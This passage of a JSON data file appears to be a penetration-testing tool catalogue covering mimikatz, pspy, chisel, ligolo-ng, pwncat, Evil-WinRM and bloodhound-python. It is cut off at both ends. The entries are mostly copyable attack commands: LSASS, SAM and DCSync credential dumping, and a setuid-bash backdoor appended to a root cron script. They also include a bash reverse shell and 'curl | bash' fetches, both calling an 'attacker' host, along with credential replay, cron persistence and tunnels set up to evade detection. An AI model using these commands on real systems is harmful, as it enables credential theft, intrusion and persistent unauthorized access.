            "copyable": true
          },
          {
            "detail": "cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ~/loot/mimikatz.exe",
            "copyable": true
          },
          {
            "detail": "python3 -m http.server 8000 --directory ~/loot",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use wine or a disposable Windows VM to run mimikatz from Linux for testing.",
        "steps": [
          {
            "detail": "docker pull caffix/winemimikatz",
            "copyable": true
          },
          {
            "detail": "docker run --rm -it -v $(pwd):/loot caffix/winemimikatz wine mimikatz.exe",
            "copyable": true
          },
          {
            "detail": "wine mimikatz.exe \"privilege::debug\"",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Extract credentials from memory",
        "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
        "notes": []
      },
      {
        "description": "Interactive mode",
        "command": "mimikatz.exe",
        "notes": []
      },
      {
        "description": "Dump SAM database",
        "command": "mimikatz.exe \"lsadump::sam\" exit",
        "notes": []
      },
      {
        "description": "Extract Kerberos tickets",
        "command": "mimikatz.exe \"kerberos::list\" exit",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "privilege::debug",
        "description": "Enable debug privileges"
      },
      {
        "flag": "sekurlsa::logonpasswords",
        "description": "Extract logon passwords"
      },
      {
        "flag": "lsadump::sam",
        "description": "Dump SAM database"
      },
      {
        "flag": "kerberos::list",
        "description": "List Kerberos tickets"
      },
      {
        "flag": "crypto::certificates",
        "description": "Extract certificates"
      },
      {
        "flag": "vault::cred",
        "description": "Extract vault credentials"
      }
    ],
    "operational_tips": [
      "Requires SYSTEM privileges for full functionality.",
      "Use interactive mode for complex operations.",
      "Document all extracted credentials securely.",
      "Be aware of antivirus detection and mitigation."
    ],
    "step_sequences": [
      {
        "title": "Interactive credential harvest",
        "steps": [
          {
            "title": "Elevate",
            "details": "Launch mimikatz from an Administrator or SYSTEM context.",
            "command": "mimikatz # privilege::debug"
          },
          {
            "title": "Dump logon sessions",
            "details": "Collect cleartext and NTLM credentials from LSASS.",
            "command": "mimikatz # sekurlsa::logonpasswords"
          },
          {
            "title": "DCSync",
            "details": "Request secrets from the domain controller without writing to disk.",
            "command": "mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt"
          },
          {
            "title": "Cleanup",
            "details": "Remove binaries if scope demands minimal artifacts.",
            "command": "del C:\\Windows\\Temp\\mimikatz.exe"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Credential harvest \u2192 Lateral movement \u2192 Privilege escalation",
        "stages": [
          {
            "label": "Harvest",
            "description": "Use mimikatz to dump credentials or execute DCSync.",
            "command": "mimikatz # sekurlsa::logonpasswords"
          },
          {
            "label": "Move",
            "description": "Replay recovered creds via Evil-WinRM or Impacket tools.",
            "command": "evil-winrm -i fileserver -u svc_backup -p 'RecoveredPass1!'"
          },
          {
            "label": "Escalate",
            "description": "Run WinPEAS/BloodHound with the new access to find escalation vectors.",
            "command": "winpeas.exe > C:\\Users\\svc_backup\\Desktop\\winpeas.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Authentication Id : 0 ; 123456",
        "meaning": "Each logon session is enumerated; focus on those with admin rights.",
        "severity": "info"
      },
      {
        "indicator": "msv : * Username : administrator",
        "meaning": "Credential material for the specified user was recovered.",
        "severity": "high"
      },
      {
        "indicator": "ERROR kull_m_memory_open : 0x00000005",
        "meaning": "Access denied; run as Administrator with SeDebugPrivilege enabled.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Minidump offline analysis",
        "scenario": "Dump LSASS once and process on an analyst box to reduce dwell time.",
        "command": "mimikatz # sekurlsa::minidump lsass.dmp && sekurlsa::logonpasswords",
        "notes": [
          "Capture lsass.dmp with procdump or comsvcs.dll before copying off the host.",
          "Securely store dumps because they contain all credentials."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Mimikatz GitHub",
        "url": "https://github.com/gentilkiwi/mimikatz",
        "description": "Official releases and command docs."
      }
    ]
  },
  {
    "id": "pspy",
    "name": "Pspy",
    "summary": "Pspy is a command line tool designed to snoop on processes without need for root permissions. It's useful for monitoring process activity.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Download the statically compiled binary for the target architecture.",
        "steps": [
          {
            "detail": "mkdir -p ~/loot/pspy && cd ~/loot/pspy",
            "copyable": true
          },
          {
            "detail": "wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
            "copyable": true
          },
          {
            "detail": "chmod +x pspy64",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Build from source for ARM or musl targets when needed.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y golang",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/DominicBreuker/pspy.git",
            "copyable": true
          },
          {
            "detail": "cd pspy && go build",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Serve binaries over HTTP/SFTP to transfer into restricted environments.",
        "steps": [
          {
            "detail": "python3 -m http.server 8081 --directory ~/loot/pspy",
            "copyable": true
          },
          {
            "detail": "curl http://attacker:8081/pspy64 -o /tmp/pspy64",
            "copyable": true
          },
          {
            "detail": "chmod +x /tmp/pspy64",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Monitor processes",
        "command": "./pspy64",
        "notes": []
      },
      {
        "description": "Print commands only",
        "command": "./pspy64 -pf",
        "notes": []
      },
      {
        "description": "Log to file",
        "command": "./pspy64 -l /tmp/pspy.log",
        "notes": []
      },
      {
        "description": "Monitor specific user",
        "command": "./pspy64 -u root",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-p",
        "description": "Print commands"
      },
      {
        "flag": "-f",
        "description": "Print file system events"
      },
      {
        "flag": "-l",
        "description": "Log to file"
      },
      {
        "flag": "-u",
        "description": "Monitor specific user"
      },
      {
        "flag": "-d",
        "description": "Delay between scans"
      }
    ],
    "operational_tips": [
      "Good for discovering privilege escalation opportunities.",
      "Monitor file system changes for sensitive files.",
      "Combine with other tools for comprehensive monitoring.",
      "Run for extended periods to catch periodic tasks."
    ],
    "step_sequences": [
      {
        "title": "Monitoring privileged activity",
        "steps": [
          {
            "title": "Launch watcher",
            "details": "Run pspy from /tmp with executable bit set to capture process creation events.",
            "command": "./pspy64"
          },
          {
            "title": "Filter noise",
            "details": "Use grep or -c to highlight commands executed via sudo/systemd.",
            "command": "./pspy64 | grep sudo"
          },
          {
            "title": "Capture exploitable task",
            "details": "Log writable scripts or timers triggered by root.",
            "command": "./pspy64 -p -i 500 | tee /tmp/pspy.log"
          },
          {
            "title": "Exploit window",
            "details": "Modify writable scripts discovered by pspy to escalate privileges.",
            "command": "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "pspy \u2192 LinPEAS \u2192 Exploit suggester",
        "stages": [
          {
            "label": "Observe",
            "description": "Run pspy to watch cron/systemd activity in real time.",
            "command": "./pspy64 -p -i 1000"
          },
          {
            "label": "Enumerate",
            "description": "Use LinPEAS to confirm writable paths or misconfigurations identified by pspy.",
            "command": "curl http://attacker/linpeas.sh | bash"
          },
          {
            "label": "Recommend",
            "description": "Feed system info to linux-exploit-suggester for exploitation ideas.",
            "command": "linux-exploit-suggester.sh > suggester.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[CMD] UID=0  /usr/bin/python3 /usr/local/bin/backup.py",
        "meaning": "Root executed a script; check write permissions for privilege escalation.",
        "severity": "high"
      },
      {
        "indicator": "[NEWPROCESS] UID=1000  /usr/bin/sudo -u root /usr/bin/find",
        "meaning": "A sudo call may be hijacked via PATH or wrapper scripts.",
        "severity": "medium"
      },
      {
        "indicator": "[ERROR] failed to read /proc/1234/environ",
        "meaning": "Process terminated before inspection; lower interval or run as root.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Keyword highlighting",
        "scenario": "Reduce noise by only printing lines containing sensitive commands.",
        "command": "./pspy64 -p -i 1000 -c sudo,systemctl",
        "notes": [
          "The -c flag accepts a comma-separated list of keywords to highlight.",
          "Pair with -i for short-lived cron jobs."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "pspy releases",
        "url": "https://github.com/DominicBreuker/pspy/releases",
        "description": "Download binaries for x86/x64/ARM."
      }
    ]
  },
  {
    "id": "chisel",
    "name": "Chisel",
    "summary": "Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Build from Go source for the latest features.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y golang",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/jpillora/chisel.git",
            "copyable": true
          },
          {
            "detail": "cd chisel && go build",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via apt and stage both server and client binaries for transfer.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y chisel",
            "copyable": true
          },
          {
            "detail": "cp /usr/bin/chisel ~/loot/chisel-server",
            "copyable": true
          },
          {
            "detail": "python3 -m http.server 9001 --directory ~/loot",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use the official container when a Go toolchain is unavailable.",
        "steps": [
          {
            "detail": "docker pull jpillora/chisel",
            "copyable": true
          },
          {
            "detail": "docker run --rm -p 8000:8000 jpillora/chisel server -p 8000 --reverse",
            "copyable": true
          },
          {
            "detail": "docker run --rm jpillora/chisel client attacker:8000 R:1080:socks",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Start chisel server",
        "command": "chisel server --port 8080",
        "notes": []
      },
      {
        "description": "Connect to server",
        "command": "chisel client server:8080 8080:127.0.0.1:3000",
        "notes": []
      },
      {
        "description": "SOCKS proxy",
        "command": "chisel client server:8080 socks",
        "notes": []
      },
      {
        "description": "Reverse tunnel",
        "command": "chisel client server:8080 R:9000:127.0.0.1:22",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "server",
        "description": "Run as server"
      },
      {
        "flag": "client",
        "description": "Run as client"
      },
      {
        "flag": "--port",
        "description": "Server listening port"
      },
      {
        "flag": "--reverse",
        "description": "Reverse tunnel mode"
      },
      {
        "flag": "--socks5",
        "description": "SOCKS5 proxy mode"
      },
      {
        "flag": "--auth",
        "description": "Authentication"
      }
    ],
    "operational_tips": [
      "SOCKS proxy is useful for web application testing.",
      "Secure tunneling with SSH authentication.",
      "Monitor bandwidth usage on large transfers.",
      "Use for bypassing network restrictions."
    ],
    "step_sequences": [
      {
        "title": "Reverse SOCKS tunnel",
        "steps": [
          {
            "title": "Start server",
            "details": "Run on the attacker laptop to accept reverse connections.",
            "command": "./chisel server -p 8000 --reverse"
          },
          {
            "title": "Transfer client",
            "details": "Upload chisel.exe to the compromised host via HTTP/SMB.",
            "command": "powershell -c \"iwr http://attacker:9001/chisel.exe -OutFile C:\\Temp\\chisel.exe\""
          },
          {
            "title": "Establish tunnel",
            "details": "Expose internal network through a SOCKS proxy for tooling.",
            "command": "chisel.exe client attacker:8000 R:1080:socks"
          },
          {
            "title": "Route traffic",
            "details": "Use proxychains to send BloodHound, RDP, or SMB through the tunnel.",
            "command": "proxychains4 bloodhound-python -c All -d corp.local"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Tunnel chaining",
        "stages": [
          {
            "label": "Initial tunnel",
            "description": "Create a chisel reverse tunnel from the DMZ host to your system.",
            "command": "./chisel server -p 8000 --reverse"
          },
          {
            "label": "Ligolo-ng pivot",
            "description": "Run ligolo-ng inside chisel to reach segmented VLANs.",
            "command": "ligolo-ng proxy --bind 127.0.0.1:11601"
          },
          {
            "label": "Post-ex tooling",
            "description": "Use proxychains-enabled BloodHound/Impacket through the stacked tunnels.",
            "command": "proxychains4 bloodhound-python -c ACL -d corp.local"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "server: Listening on 0.0.0.0:8000",
        "meaning": "The listener is ready; ensure ingress firewall rules allow connections.",
        "severity": "info"
      },
      {
        "indicator": "client: Handshaking...",
        "meaning": "The client is negotiating; if it hangs, verify MTU/firewall and shared secret.",
        "severity": "info"
      },
      {
        "indicator": "client: connection closed",
        "meaning": "Tunnel dropped; restart client or enable --keepalive to recover automatically.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "TLS + authentication",
        "scenario": "Protect tunnels that cross monitored networks.",
        "command": "./chisel server -p 8443 --reverse --key sharedsecret --tls-sni internal.corp",
        "notes": [
          "Use matching --key on the client to enforce authentication.",
          "SNI helps blend with normal HTTPS traffic."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Chisel GitHub",
        "url": "https://github.com/jpillora/chisel",
        "description": "Official docs and examples."
      }
    ]
  },
  {
    "id": "ligolo-ng",
    "name": "Ligolo-ng",
    "summary": "Ligolo-ng is an advanced, simple, and powerful tunneling/pivoting tool that uses TUN interfaces.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Build the proxy and agent binaries using Go 1.21+.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y golang",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/nicocha30/ligolo-ng.git",
            "copyable": true
          },
          {
            "detail": "cd ligolo-ng && make",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from package repos and stage both proxy and agent.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y ligolo-ng",
            "copyable": true
          },
          {
            "detail": "cp /usr/bin/ligolo-ng ~/loot/proxy",
            "copyable": true
          },
          {
            "detail": "cp /usr/bin/ligolo-ng-agent ~/loot/agent",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use quay.io/ligolo-ng container to host the proxy quickly.",
        "steps": [
          {
            "detail": "docker pull quay.io/nicocha30/ligolo-ng",
            "copyable": true
          },
          {
            "detail": "docker run --rm -p 11601:11601/udp quay.io/nicocha30/ligolo-ng proxy --bind 0.0.0.0:11601",
            "copyable": true
          },
          {
            "detail": "docker run --rm quay.io/nicocha30/ligolo-ng agent --connect attacker:11601",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Start proxy server",
        "command": "proxy -h 0.0.0.0 -p 443",
        "notes": []
      },
      {
        "description": "Connect agent",
        "command": "agent -connect 192.168.1.100:443",
        "notes": []
      },
      {
        "description": "Auto-reconnect",
        "command": "agent -connect 192.168.1.100:443 --auto-reconnect",
        "notes": []
      },
      {
        "description": "Ignore certificates",
        "command": "agent -connect 192.168.1.100:443 --ignore-cert",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-h",
        "description": "Server host"
      },
      {
        "flag": "-p",
        "description": "Server port"
      },
      {
        "flag": "-connect",
        "description": "Connect to server"
      },
      {
        "flag": "--auto-reconnect",
        "description": "Auto-reconnect mode"
      },
      {
        "flag": "--ignore-cert",
        "description": "Ignore SSL certificates"
      },
      {
        "flag": "--token",
        "description": "Authentication token"
      }
    ],
    "operational_tips": [
      "Auto-reconnect is useful for unstable connections.",
      "Ignore certificates for testing environments.",
      "Monitor agent connections and traffic.",
      "Use TUN interfaces for network pivoting."
    ],
    "step_sequences": [
      {
        "title": "Pivoting with ligolo-ng",
        "steps": [
          {
            "title": "Start proxy",
            "details": "Run on the operator host, binding to a UDP port.",
            "command": "ligolo-ng proxy --bind 0.0.0.0:11601"
          },
          {
            "title": "Launch agent",
            "details": "Execute on compromised system to connect back to the proxy.",
            "command": "./ligolo-ng-agent --connect attacker:11601 --key sharedsecret"
          },
          {
            "title": "Configure tunnel",
            "details": "In the proxy console, create tun interfaces and add routes.",
            "command": "ligolo-ng> interface create --name corp && interface up corp"
          },
          {
            "title": "Route traffic",
            "details": "Add target subnets to the tun interface and use proxychains/socat.",
            "command": "ligolo-ng> route add corp 10.20.30.0/24"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Ligolo pivot to AD reconnaissance",
        "stages": [
          {
            "label": "Deploy ligolo",
            "description": "Create an L3 tunnel into the internal network.",
            "command": "ligolo-ng proxy --bind 0.0.0.0:11601"
          },
          {
            "label": "Run BloodHound",
            "description": "Send BloodHound collectors through the tunnel.",
            "command": "proxychains4 bloodhound-python -d corp.local -u svc -p Pass123! -c ACL"
          },
          {
            "label": "Stage lateral tools",
            "description": "Use proxychains with CrackMapExec/Evil-WinRM for deeper movement.",
            "command": "proxychains4 evil-winrm -i dc01 -u administrator -p Pass123!"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Proxy started, waiting for agents...",
        "meaning": "Proxy listening; deploy agents to establish tunnels.",
        "severity": "info"
      },
      {
        "indicator": "New agent connected from 10.0.5.12",
        "meaning": "Compromised host is reachable; you can now create interfaces/routes.",
        "severity": "info"
      },
      {
        "indicator": "route added: 10.20.30.0/24",
        "meaning": "Traffic for that subnet will traverse the tunnel; confirm with ping/proxychains.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Agent relays",
        "scenario": "Pivot through multiple hosts by chaining agents.",
        "command": "ligolo-ng-agent --connect attacker:11601 --relay 10.20.30.5:11601",
        "notes": [
          "Use relays when intermediate hosts lack direct egress.",
          "Document tunnel topology to simplify teardown."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Ligolo-ng GitHub",
        "url": "https://github.com/nicocha30/ligolo-ng",
        "description": "Documentation and release binaries."
      }
    ]
  },
  {
    "id": "pwncat",
    "name": "Pwncat",
    "summary": "Pwncat is a post-exploitation framework that provides a reverse shell with advanced features like file transfer and persistence.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install pwncat-cs via pipx and ensure Python 3.9+ is available.",
        "steps": [
          {
            "detail": "python3 -m pip install --user pipx",
            "copyable": true
          },
          {
            "detail": "python3 -m pipx ensurepath",
            "copyable": true
          },
          {
            "detail": "pipx install pwncat-cs",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Use apt package and synchronize modules with upstream releases.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y pwncat",
            "copyable": true
          },
          {
            "detail": "pwncat --version",
            "copyable": true
          },
          {
            "detail": "pwncat --list-modules",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use the community container when pipx is not allowed.",
        "steps": [
          {
            "detail": "docker pull calebstewart/pwncat",
            "copyable": true
          },
          {
            "detail": "docker run --rm -it calebstewart/pwncat --help",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/loot calebstewart/pwncat --connect tcp://0.0.0.0:4444",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Start listener",
        "command": "pwncat -l 4444",
        "notes": []
      },
      {
        "description": "Connect to target",
        "command": "pwncat 192.168.1.100 4444",
        "notes": []
      },
      {
        "description": "Generate payload",
        "command": "pwncat -g linux -o payload.sh",
        "notes": []
      },
      {
        "description": "Persist access",
        "command": "# After connecting: persist add --user root --method cron",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-l",
        "description": "Listen mode"
      },
      {
        "flag": "-g",
        "description": "Generate payload"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "--persist",
        "description": "Persistence mechanism"
      },
      {
        "flag": "--encrypt",
        "description": "Encrypt connection"
      }
    ],
    "operational_tips": [
      "File transfer capabilities are very useful.",
      "Built-in persistence options for access maintenance.",
      "Encrypt connections for better security.",
      "Document all post-exploitation activities."
    ],
    "step_sequences": [
      {
        "title": "Managing a reverse shell",
        "steps": [
          {
            "title": "Start listener",
            "details": "Prepare pwncat to accept a reverse shell over TCP.",
            "command": "pwncat --listen 0.0.0.0:4444"
          },
          {
            "title": "Receive session",
            "details": "Trigger payload on target to connect back to the listener.",
            "command": "bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'"
          },
          {
            "title": "Stabilize",
            "details": "Upgrade to a full TTY and record environment details.",
            "command": "pwncat> run stabilize"
          },
          {
            "title": "Enumerate",
            "details": "Use built-in modules to gather privilege escalation data.",
            "command": "pwncat> run linpeas"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Reverse shell \u2192 Enumeration \u2192 Pivot",
        "stages": [
          {
            "label": "Pwncat listener",
            "description": "Catch shells and automatically stabilize them.",
            "command": "pwncat --listen 0.0.0.0:9001"
          },
          {
            "label": "Enumeration",
            "description": "Run LinPEAS or custom modules from pwncat.",
            "command": "pwncat> run linpeas"
          },
          {
            "label": "Pivot",
            "description": "Drop chisel or ligolo-ng clients from the live session to move laterally.",
            "command": "pwncat> upload chisel.exe /tmp/chisel.exe && chmod +x /tmp/chisel.exe"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[*] received connection from 10.0.5.23",
        "meaning": "A new session is active; background it for multi-host operations.",
        "severity": "info"
      },
      {
        "indicator": "[*] registered new privilege escalation module",
        "meaning": "Pwncat discovered a potential escalation technique automatically.",
        "severity": "medium"
      },
      {
        "indicator": "[!] session closed",
        "meaning": "Target disconnected; check network reachability or restart listener.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Windows agent mode",
        "scenario": "Interact with Windows reverse shells using proper encodings.",
        "command": "pwncat --connect tcp://victim:4444 --platform windows",
        "notes": [
          "Set --platform windows to enable PowerShell helpers and correct newline handling.",
          "Use run upload to transfer binaries without breaking encoding."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "pwncat-cs docs",
        "url": "https://github.com/calebstewart/pwncat",
        "description": "Module reference and usage examples."
      }
    ]
  },
  {
    "id": "evil-winrm",
    "name": "Evil-WinRM",
    "summary": "Evil-WinRM is a WinRM shell for hacking/pentesting written in Ruby with features like file transfer and command execution.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via Ruby gems and trust WinRM certificates.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y ruby ruby-dev build-essential",
            "copyable": true
          },
          {
            "detail": "sudo gem install evil-winrm",
            "copyable": true
          },
          {
            "detail": "evil-winrm -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali ships Evil-WinRM; keep /usr/share/evil-winrm payloads updated.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y evil-winrm",
            "copyable": true
          },
          {
            "detail": "ls /usr/share/evil-winrm/ps_scripts",
            "copyable": true
          },
          {
            "detail": "evil-winrm -i 10.0.5.21 -u administrator -p Pass123!",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Docker to avoid polluting local Ruby environments.",
        "steps": [
          {
            "detail": "docker pull htrgouvea/evil-winrm",
            "copyable": true
          },
          {
            "detail": "docker run --rm -it htrgouvea/evil-winrm -h",
            "copyable": true
          },
          {
            "detail": "docker run --rm -it htrgouvea/evil-winrm -i target -u administrator -p Pass123!",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic connection",
        "command": "evil-winrm -i 192.168.1.100 -u admin -p password",
        "notes": []
      },
      {
        "description": "Hash authentication",
        "command": "evil-winrm -i 192.168.1.100 -u admin -H 'hash'",
        "notes": []
      },
      {
        "description": "Use SSL",
        "command": "evil-winrm -i 192.168.1.100 -u admin -p password -s",
        "notes": []
      },
      {
        "description": "File upload",
        "command": "# After connecting: upload /local/file.txt C:\\temp\\file.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-i",
        "description": "Target IP"
      },
      {
        "flag": "-u",
        "description": "Username"
      },
      {
        "flag": "-p",
        "description": "Password"
      },
      {
        "flag": "-H",
        "description": "NTLM hash"
      },
      {
        "flag": "-s",
        "description": "SSL connection"
      },
      {
        "flag": "-P",
        "description": "Port number"
      }
    ],
    "operational_tips": [
      "Hash authentication bypasses password requirements.",
      "File transfer capabilities for data exfiltration.",
      "Script execution for automation tasks.",
      "Use SSL for encrypted communications."
    ],
    "step_sequences": [
      {
        "title": "Authenticated WinRM shell",
        "steps": [
          {
            "title": "Connect",
            "details": "Provide host, username, and password/hash for the session.",
            "command": "evil-winrm -i dc01.corp.local -u administrator -p 'Pass123!'"
          },
          {
            "title": "Upload helper script",
            "details": "Use built-in upload to transfer PowerShell scripts like WinPEAS.",
            "command": "*Evil-WinRM* PS C:\\> upload winpeas.ps1 C:\\Temp\\winpeas.ps1"
          },
          {
            "title": "Execute commands",
            "details": "Run PowerShell or native commands inside the remote shell.",
            "command": "*Evil-WinRM* PS C:\\> powershell -ExecutionPolicy Bypass -File C:\\Temp\\winpeas.ps1"
          },
          {
            "title": "Pivot",
            "details": "Use Evil-WinRM to drop persistence agents or tunneling tools.",
            "command": "*Evil-WinRM* PS C:\\> upload chisel.exe C:\\Temp\\chisel.exe"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Credentials \u2192 Evil-WinRM \u2192 Post-ex",
        "stages": [
          {
            "label": "Harvest creds",
            "description": "Obtain credentials via mimikatz, BloodHound, or sprays.",
            "command": "mimikatz # sekurlsa::logonpasswords"
          },
          {
            "label": "Establish WinRM shell",
            "description": "Use Evil-WinRM for stable PowerShell access.",
            "command": "evil-winrm -i fileserver -u svc_backup -p 'RecoveredPass1!'"
          },
          {
            "label": "Post-ex",
            "description": "Run WinPEAS/PowerSploit modules to escalate privileges further.",
            "command": "*Evil-WinRM* PS C:\\> upload winPEASany.exe C:\\Temp\\winpeas.exe"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "*Evil-WinRM* PS C:\\Users\\Administrator> ",
        "meaning": "Shell is ready; commands executed here run on the remote host.",
        "severity": "info"
      },
      {
        "indicator": "Command execution is disabled on this system",
        "meaning": "PowerShell restricted language mode; use -S or upload bypass scripts.",
        "severity": "warning"
      },
      {
        "indicator": "The WinRM client received an HTTP status code of 401",
        "meaning": "Authentication failed; confirm creds or allow network access.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Kerberos and certificates",
        "scenario": "Use Kerberos tickets or certificates when NTLM is blocked.",
        "command": "evil-winrm -i dc01 -r CORP.LOCAL -k -s /path/to/ticket.kirbi",
        "notes": [
          "Combine with Rubeus or impacket-getTGT to obtain tickets.",
          "Use --ssl when WinRM over HTTPS is enforced."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Evil-WinRM GitHub",
        "url": "https://github.com/Hackplayers/evil-winrm",
        "description": "Docs, payload folders, and usage guides."
      }
    ]
  },
  {
    "id": "bloodhound-python",
    "name": "BloodHound-Python",
    "summary": "BloodHound-Python is a Python ingestor for BloodHound, used for Active Directory reconnaissance and attack path visualization.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via pipx to keep dependencies isolated.",
        "steps": [
          {
            "detail": "python3 -m pip install --user pipx",
            "copyable": true
          },
          {
            "detail": "python3 -m pipx ensurepath",
            "copyable": true
          },
          {
            "detail": "pipx install bloodhound",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali bundles bloodhound-python; sync Neo4j/BloodHound UI separately.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y bloodhound bloodhound-python",
            "copyable": true
          },
          {
            "detail": "bloodhound-python --help",
            "copyable": true
          },
          {
            "detail": "sudo neo4j start",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use the SpecterOps container for collectors when Python conflicts exist.",
        "steps": [
          {
            "detail": "docker pull specterops/bloodhound",
            "copyable": true
          },
          {
            "detail": "docker run --rm specterops/bloodhound bloodhound-python -h",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/loot specterops/bloodhound bloodhound-python -c All -u svc -p Pass123! -d corp.local -ns dc01 --zip -o /loot",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Full collection",
        "command": "bloodhound-python -c All -u admin -p password -d domain.local -ns 192.168.1.1",
        "notes": []
      },
      {
        "description": "Session collection only",
        "command": "bloodhound-python -c Session -u admin -p password -d domain.local",
        "notes": []
      },
      {
        "description": "Use Kerberos auth",
        "command": "bloodhound-python -c All -k -d domain.local -u admin@domain.local",
        "notes": []
      },
      {
        "description": "Save to specific directory",
        "command": "bloodhound-python -c All -u admin -p password -d domain.local --output-dir /tmp/bloodhound",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-c",
        "description": "Collection methods"
      },
      {
        "flag": "-u",
        "description": "Username"
      },
      {
        "flag": "-p",
        "description": "Password"
      },
      {
        "flag": "-d",
        "description": "Domain"
      },
      {
        "flag": "-ns",
        "description": "Name server"
      },
      {
        "flag": "--output-dir",
        "description": "Output directory"
      },
      {
        "flag": "-k",
        "description": "Kerberos authentication"
      }
    ],
    "operational_tips": [
      "Import data into BloodHound for visualization.",
      "Document attack paths for privilege escalation.",
      "Combine with other AD tools for complete picture.",
      "Use appropriate collection methods for stealth."
    ],
    "step_sequences": [
      {
        "title": "Collecting with bloodhound-python",
        "steps": [
          {
            "title": "Enumerate LDAP",
            "details": "Run collectors for domain objects, sessions, and ACLs.",
            "command": "bloodhound-python -d corp.local -u svc -p Pass123! -c All -ns dc01.corp.local"
          },
          {
            "title": "Zip results",
            "details": "Compress JSON output into a SharpHound-compatible archive.",
            "command": "zip -r corp_bh.zip *.json"
          },
          {
            "title": "Import into UI",
            "details": "Upload the zip to BloodHound and start analysis queries.",
